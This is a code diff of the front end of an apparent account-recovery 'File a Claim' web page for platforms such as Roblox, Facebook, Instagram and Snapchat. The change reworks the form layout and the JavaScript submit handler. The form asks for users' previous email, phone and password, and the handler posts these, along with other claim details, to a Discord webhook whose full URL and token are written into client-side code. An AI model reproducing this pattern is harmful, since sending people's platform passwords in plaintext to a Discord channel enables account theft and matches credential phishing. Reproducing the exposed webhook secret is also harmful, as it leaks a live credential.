@@ -11,8 +11,8 @@
     .container { padding: 2rem; max-width: 600px; margin: auto; }
     h1 { text-align: center; margin-bottom: 1rem; }
     form { background: #222; padding: 1.5rem; border-radius: 8px; display: flex; flex-direction: column; gap: 1rem; }
-    label { display: flex; flex-direction: column; font-size: 0.9rem; }
-    select, input[type="text"], textarea, button { width: 100%; padding: 0.75rem; border-radius: 6px; border: none; font-size: 1rem; }
+    label { font-size: 0.9rem; }
+    select, input, textarea, button { width: 100%; padding: 0.75rem; border-radius: 6px; border: none; font-size: 1rem; }
     textarea { resize: vertical; min-height: 80px; }
     button { background: #4fc3f7; color: #111; font-weight: bold; cursor: pointer; }
     button:hover { background: #0288d1; }
@@ -24,28 +24,28 @@
   <div class="container">
     <h1>📝 File a Claim</h1>
     <form id="claimForm">
-      <label for="platform">Platform
-        <select id="platform" required>
-          <option value="">-- Select Platform --</option>
-          <option value="Roblox">Roblox</option>
-          <option value="Facebook">Facebook</option>
-          <option value="Instagram">Instagram</option>
-          <option value="Snapchat">Snapchat</option>
-          <option value="Other">Other</option>
-        </select>
-      </label>
-      <label for="accountId">Account Username/ID
-        <input type="text" id="accountId" placeholder="e.g. user123" required />
-      </label>
-      <label for="description">Issue Description
-        <textarea id="description" placeholder="Describe what happened" required></textarea>
-      </label>
-      <label for="previousInfo">Previous Account Info (email, phone, password)
-        <input type="text" id="previousInfo" placeholder="Optional past info" />
-      </label>
-      <label for="attackerInfo">Attacker Info (if known)
-        <input type="text" id="attackerInfo" placeholder="Optional attacker contact" />
-      </label>
+      <label for="platform">Platform</label>
+      <select id="platform" name="platform" required>
+        <option value="">-- Select Platform --</option>
+        <option value="Roblox">Roblox</option>
+        <option value="Facebook">Facebook</option>
+        <option value="Instagram">Instagram</option>
+        <option value="Snapchat">Snapchat</option>
+        <option value="Other">Other</option>
+      </select>
+
+      <label for="accountId">Account Username/ID</label>
+      <input type="text" id="accountId" name="accountId" placeholder="e.g. user123" required />
+
+      <label for="description">Issue Description</label>
+      <textarea id="description" name="description" placeholder="Describe what happened" required></textarea>
+
+      <label for="previousInfo">Previous Account Info (email, phone, password)</label>
+      <input type="text" id="previousInfo" name="previousInfo" placeholder="Optional past info" />
+
+      <label for="attackerInfo">Attacker Info (if known)</label>
+      <input type="text" id="attackerInfo" name="attackerInfo" placeholder="Optional attacker contact" />
+
       <button type="submit">Submit Claim</button>
     </form>
     <div id="submitStatus"></div>
@@ -73,17 +73,24 @@
     });
 
     form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+      e.preventDefault(); // ensure no default GET submission
+      console.log('Form submission prevented, handling with JS');
       if (!currentUser) return;
+
+      const platform = document.getElementById('platform').value;
+      const accountId = document.getElementById('accountId').value;
+      const description = document.getElementById('description').value;
+      const previousInfo = document.getElementById('previousInfo').value;
+      const attackerInfo = document.getElementById('attackerInfo').value;
 
       const data = {
         uid: currentUser.uid,
         email: currentUser.email,
-        platform: form.platform.value,
-        accountId: form.accountId.value,
-        description: form.description.value,
-        previousInfo: form.previousInfo.value || '',
-        attackerInfo: form.attackerInfo.value || '',
+        platform,
+        accountId,
+        description,
+        previousInfo: previousInfo || '',
+        attackerInfo: attackerInfo || '',
         status: 'pending',
         timestamp: serverTimestamp()
       };
@@ -91,11 +98,12 @@
       try {
         const docRef = await addDoc(collection(db, 'claims'), data);
         const claimId = docRef.id;
-        const claimUrl = `${window.location.origin}/claim.html?id=${claimId}`;
-        const approveUrl = `${window.location.origin}/process.html?id=${claimId}&action=approve`;
-        const rejectUrl = `${window.location.origin}/process.html?id=${claimId}&action=reject`;
+        const origin = window.location.origin;
+        const claimUrl = `${origin}/claim.html?id=${claimId}`;
+        const approveUrl = `${origin}/process.html?id=${claimId}&action=approve`;
+        const rejectUrl = `${origin}/process.html?id=${claimId}&action=reject`;
 
-        // Fire Discord webhook
+        // send Discord webhook
         await fetch('https://discord.com/api/webhooks/1398060748093128765/HhvxXPIdCMeyqbR6bsSyCcWPSRwkRaAkJHAdhRTyfY5Hw_NZvrh6JkYRr9lr7z4PeUD3', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -105,10 +113,10 @@
               title: '📨 New Claim Submitted',
               color: 3447003,
               fields: [
-                { name: 'Platform', value: data.platform, inline: true },
-                { name: 'User', value: data.email, inline: true },
-                { name: 'Account ID', value: data.accountId, inline: false },
-                { name: 'Description', value: data.description, inline: false },
+                { name: 'Platform', value: platform, inline: true },
+                { name: 'User', value: currentUser.email, inline: true },
+                { name: 'Account ID', value: accountId, inline: false },
+                { name: 'Description', value: description, inline: false },
                 { name: 'Previous Info', value: data.previousInfo || 'N/A', inline: false },
                 { name: 'Attacker Info', value: data.attackerInfo || 'N/A', inline: false }
               ],
